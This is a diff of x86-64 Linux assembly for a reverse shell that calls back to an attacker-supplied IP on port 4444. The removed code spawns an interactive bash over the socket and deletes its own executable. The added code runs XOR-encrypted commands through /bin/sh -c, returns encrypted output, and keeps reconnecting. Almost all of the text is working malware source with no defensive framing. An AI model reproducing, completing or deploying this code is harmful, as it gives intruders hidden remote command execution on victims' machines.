@@ -1,246 +1,357 @@
 section .data
-    ; Commandes et arguments
-    command      db '/bin/bash',0
-    bash_i       db '-i',0
-    bash_args    dq command, bash_i, 0
-    term_env     db 'TERM=xterm',0
-    env_vars     dq term_env, 0
-    
-    ; Messages d'erreur
+    timespec     dq 5, 0
+    port_num     dw 4444
+    xor_key      db 0x41, 0x42, 0x43, 0x44
+
     err_usage    db 'Usage: ./reverse <attacker_ip>',10,0
+    err_usage_len equ $ - err_usage - 1
     err_ip_format db 'Error: Invalid IP format',10,0
+    err_ip_format_len equ $ - err_ip_format - 1
     err_socket   db 'Error: Socket creation failed',10,0
+    err_socket_len equ $ - err_socket - 1
     err_connect  db 'Error: Connection failed',10,0
-    timespec     dq 5, 0          ; 5 secondes entre les tentatives
-    
-    ; Chemins système
-    self_path    db '/proc/self/exe',0
-    port_str     db '4444',0       ; Port fixe
+    err_connect_len equ $ - err_connect - 1
+
+    shell_path   db '/bin/sh', 0
+    shell_c      db '-c', 0
 
 section .bss
-    ip_bytes     resd 1           ; IP en format réseau
-    port_bytes   resw 1           ; Port en format réseau
-    self_exe     resb 256         ; Buffer pour le chemin de l'exécutable
+    ip_bytes     resd 1
+    port_bytes   resw 1
+    sockaddr     resb 16
+    cmd_buffer   resb 4096
+    result_buffer resb 8192
 
 section .text
     global _start
 
-;----------------------------------------------------------
-; Auto-suppression silencieuse
-;----------------------------------------------------------
-self_destruct:
-    mov rax, 89                   ; sys_readlink
-    mov rdi, self_path
-    mov rsi, self_exe
-    mov rdx, 256
-    syscall
-    
-    test rax, rax
-    js .finish                    ; Ignorer si erreur
-    
-    mov rdi, self_exe             ; Ajouter NULL terminal
-    add rdi, rax
-    mov byte [rdi], 0
-    
-    mov rax, 87                   ; sys_unlink
-    mov rdi, self_exe
-    syscall
+;---------------------------------------------------------
+;                   IP Validation
+;---------------------------------------------------------
 
-.finish:
-    ret
-
-;----------------------------------------------------------
-; Validation et conversion de l'IP
-; Entrée : rdi = pointeur vers la chaîne IP
-; Sortie : rax = 1 (succès), 0 (erreur)
-;----------------------------------------------------------
 validate_and_parse_ip:
     push rbp
     mov rbp, rsp
     push rbx
     push r12
-    
+    push r13
+
     mov rsi, rdi
-    xor rbx, rbx                  ; Compteur d'octets
-    xor r12d, r12d                ; IP accumulée
-    xor eax, eax                  ; Valeur d'octet courante
+    xor rbx, rbx
+    xor r12d, r12d
+    xor r13d, r13d
 
 .parse_loop:
     movzx edx, byte [rsi]
     test dl, dl
     jz .end_parse
-    
+
     cmp dl, '.'
     je .store_octet
-    
+
     cmp dl, '0'
     jb .invalid
     cmp dl, '9'
     ja .invalid
-    
+
     sub dl, '0'
-    imul eax, 10
-    add eax, edx
-    cmp eax, 255
+    imul r13d, r13d, 10
+    add r13d, edx
+    cmp r13d, 255
     ja .invalid
-    
+
     inc rsi
     jmp .parse_loop
 
 .store_octet:
-    cmp bl, 3                     ; Vérifier nombre d'octets
+    cmp bl, 3
     jae .invalid
-    
+
     shl r12d, 8
-    or r12d, eax
+    or r12d, r13d
     inc bl
-    xor eax, eax
+    xor r13d, r13d
     inc rsi
     jmp .parse_loop
 
 .end_parse:
-    cmp bl, 3                     ; Doit avoir 4 octets
+    cmp bl, 3
     jne .invalid
-    
+
     shl r12d, 8
-    or r12d, eax
-    bswap r12d                    ; Convertir en big-endian
-    mov [ip_bytes], r12d
+    or r12d, r13d
+    mov eax, r12d
+    bswap eax
+    mov [ip_bytes], eax
     mov rax, 1
     jmp .done
 
 .invalid:
     xor rax, rax
 .done:
+    pop r13
     pop r12
     pop rbx
     pop rbp
     ret
+;---------------------------------------------------------
+;                       XOR Cipher 
+;---------------------------------------------------------
 
-;----------------------------------------------------------
-; Validation et conversion du port (fixé à 4444)
-;----------------------------------------------------------
-validate_port:
-    mov rsi, port_str
-    xor rax, rax
-    xor rcx, rcx                  ; Compteur de chiffres
+xor_crypt:
+    push rbp
+    mov rbp, rsp
+    push rbx
+    push r12
+    push r13
 
-.convert_loop:
-    movzx edx, byte [rsi]
-    test dl, dl
-    jz .check_value
-    
-    cmp dl, '0'
-    jb .invalid
-    cmp dl, '9'
-    ja .invalid
-    
-    sub dl, '0'
-    imul rax, 10
-    add rax, rdx
-    cmp rax, 65535
-    ja .invalid
-    inc rsi
-    inc rcx
-    jmp .convert_loop
+    mov r10, rdi
+    mov r11, rsi
+    mov r12d, edx
+    xor r13, r13
 
-.check_value:
-    test rcx, rcx                 ; Vérifier au moins 1 chiffre
-    jz .invalid
-    
-    cmp rax, 4444                 ; Port doit être 4444
-    jne .invalid
-    
-    xchg al, ah                   ; Convertir en big-endian
-    mov [port_bytes], ax
+.loop:
+    cmp r13, r11
+    jae .end
+
+    mov ecx, r13d
+    and ecx, 3
+    shl ecx, 3
+
+    mov eax, r12d
+    shr eax, cl
+    and al, 0xFF
+
+    mov bl, [r10 + r13]
+    xor bl, al
+    mov [r10 + r13], bl
+
+    inc r13
+    jmp .loop
+
+.end:
+    pop r13
+    pop r12
+    pop rbx
+    pop rbp
+    ret
+;---------------------------------------------------------
+;                    Execute Command 
+;---------------------------------------------------------
+
+execute_command:
+    push rbp
+    mov rbp, rsp
+    push rbx
+    push r12
+    push r13
+    push r14
+    push r15
+
+    mov r12, rdi
+    mov r13, rsi
+
+    sub rsp, 8
+    mov rax, 22
+    mov rdi, rsp
+    syscall
+
+    test rax, rax
+    js .error
+
+    mov r14d, [rsp]
+    mov r15d, [rsp+4]
+    add rsp, 8
+
+    mov rax, 57
+    syscall
+
+    test rax, rax
+    jz .child_process
+    js .error
+
+    mov rbx, rax
+
+    mov rax, 3
+    mov rdi, r15
+    syscall
+
+.read_loop:
+    mov rax, 0
+    mov rdi, r14
+    lea rsi, [result_buffer]
+    mov rdx, 8192
+    syscall
+
+    test rax, rax
+    jle .read_done
+
+    mov r15, rax
+
+    lea rdi, [result_buffer]
+    mov rsi, r15
+    mov edx, [xor_key]
+    call xor_crypt
+
     mov rax, 1
-    ret
+    mov rdi, r13
+    lea rsi, [result_buffer]
+    mov rdx, r15
+    syscall
 
-.invalid:
-    xor rax, rax
-    ret
+    jmp .read_loop
 
-;----------------------------------------------------------
-; Programme principal
-;----------------------------------------------------------
+.read_done:
+    mov rax, 3
+    mov rdi, r14
+    syscall
+
+    mov rax, 61
+    mov rdi, rbx
+    xor rsi, rsi
+    xor rdx, rdx
+    xor r10, r10
+    syscall
+    jmp .done
+
+.child_process:
+    mov rax, 33
+    mov rdi, r15
+    mov rsi, 1
+    syscall
+
+    mov rax, 33
+    mov rdi, r15
+    mov rsi, 2
+    syscall
+
+    mov rax, 3
+    mov rdi, r14
+    syscall
+    mov rax, 3
+    mov rdi, r15
+    syscall
+
+    sub rsp, 32
+    lea rax, [shell_path]
+    mov [rsp], rax
+    lea rax, [shell_c]
+    mov [rsp+8], rax
+    mov [rsp+16], r12
+    mov qword [rsp+24], 0
+
+    mov rax, 59
+    lea rdi, [shell_path]
+    mov rsi, rsp
+    xor rdx, rdx
+    syscall
+
+    mov rax, 60
+    mov rdi, 1
+    syscall
+
+.error:
+.done:
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop rbx
+    pop rbp
+    ret
+;-----------------------------------------------------
+;                       Main Entry 
+;-----------------------------------------------------
+
 _start:
-    call self_destruct            ; Auto-suppression
-    
-    pop rcx                       ; argc
+    pop rcx
     cmp rcx, 2
     jne usage_error
-    
-    pop rsi                       ; argv[0]
-    pop rdi                       ; argv[1] (IP)
-    
+
+    pop rsi
+    pop rdi
+
+    test rdi, rdi
+    jz usage_error
+
     call validate_and_parse_ip
     test rax, rax
     jz ip_error
-    
-    call validate_port
-    test rax, rax
-    jz port_error
+
+    mov ax, [port_num]
+    xchg al, ah
+    mov [port_bytes], ax
 
 connection_loop:
-    ; Création du socket
-    mov rax, 41                   ; sys_socket
-    mov rdi, 2                    ; AF_INET
-    mov rsi, 1                    ; SOCK_STREAM
-    xor rdx, rdx                  ; Protocole par défaut
-    syscall 
-    
+    mov rax, 41
+    mov rdi, 2
+    mov rsi, 1
+    xor rdx, rdx
+    syscall
+
     test rax, rax
     js socket_error
-    mov r8, rax                   ; Sauvegarder le socket fd
+    mov r8, rax
 
-    ; Configuration de la structure sockaddr_in
-    sub rsp, 16
-    mov word [rsp], 2             ; AF_INET
+    lea rdi, [sockaddr]
+    mov word [rdi], 2
     mov ax, [port_bytes]
-    mov word [rsp+2], ax          ; Port
+    mov word [rdi+2], ax
     mov eax, [ip_bytes]
-    mov dword [rsp+4], eax        ; IP
-    mov qword [rsp+8], 0          ; Padding
+    mov dword [rdi+4], eax
+    mov qword [rdi+8], 0
 
-    ; Connexion
-    mov rax, 42                   ; sys_connect
-    mov rdi, r8                   ; socket fd
-    mov rsi, rsp                  ; sockaddr_in
-    mov rdx, 16                   ; addrlen
+    mov rax, 42
+    mov rdi, r8
+    lea rsi, [sockaddr]
+    mov rdx, 16
     syscall
-    add rsp, 16
-    
+
     test rax, rax
     js connect_error
 
-    ; Redirection des flux standard
-    xor rsi, rsi                  ; Descripteur cible
-.dup_loop:
-    mov rax, 33                   ; sys_dup2
-    mov rdi, r8                   ; Source (socket)
-    syscall
-    inc rsi
-    cmp rsi, 3                    ; 0=stdin, 1=stdout, 2=stderr
-    jne .dup_loop
+    mov edx, [xor_key]
+    mov r12d, edx
 
-    ; Exécution du shell interactif
-    mov rax, 59                   ; sys_execve
-    lea rdi, [command]            ; /bin/bash
-    lea rsi, [bash_args]          ; ["/bin/bash", "-i"]
-    lea rdx, [env_vars]           ; ["TERM=xterm"]
+command_loop:
+    mov rax, 0
+    mov rdi, r8
+    lea rsi, [cmd_buffer]
+    mov rdx, 4096
     syscall
 
-    ; En cas d'échec d'execve
+    test rax, rax
+    jle exit_clean
+
+    mov r13, rax
+
+    lea rdi, [cmd_buffer]
+    mov rsi, r13
+    mov rdx, r12
+    call xor_crypt
+
+    mov byte [cmd_buffer + r13], 0
+
+    lea rdi, [cmd_buffer]
+    mov rsi, r8
+    call execute_command
+
+    jmp command_loop
+
+exit_clean:
+    mov rax, 3
+    mov rdi, r8
+    syscall
     jmp exit_program
+;---------------------------------------------------------
+;                       Error Handlers 
+;---------------------------------------------------------
 
-;----------------------------------------------------------
-; Gestion des erreurs
-;----------------------------------------------------------
 usage_error:
     mov rax, 1
     mov rdi, 2
     lea rsi, [err_usage]
-    mov rdx, 30
+    mov rdx, err_usage_len
     syscall
     jmp exit_program
 
@@ -248,34 +359,30 @@ ip_error:
     mov rax, 1
     mov rdi, 2
     lea rsi, [err_ip_format]
-    mov rdx, 25
+    mov rdx, err_ip_format_len
     syscall
-    jmp exit_program
-
-port_error:
-    mov rdi, 1
     jmp exit_program
 
 socket_error:
     mov rax, 1
     mov rdi, 2
     lea rsi, [err_socket]
-    mov rdx, 28
+    mov rdx, err_socket_len
     syscall
     jmp exit_program
+
 connect_error:
-    mov rax, 3                    ; sys_close
+    mov rax, 3
     mov rdi, r8
     syscall
-    
-    mov rax, 35                   ; sys_nanosleep
+
+    mov rax, 35
     lea rdi, [timespec]
     xor rsi, rsi
     syscall
-    jmp connection_loop           ; Réessayer
+    jmp connection_loop
 
 exit_program:
-    mov rax, 60                   ; sys_exit
-    mov rdi, 1
+    mov rax, 60
+    xor rdi, rdi
     syscall
-
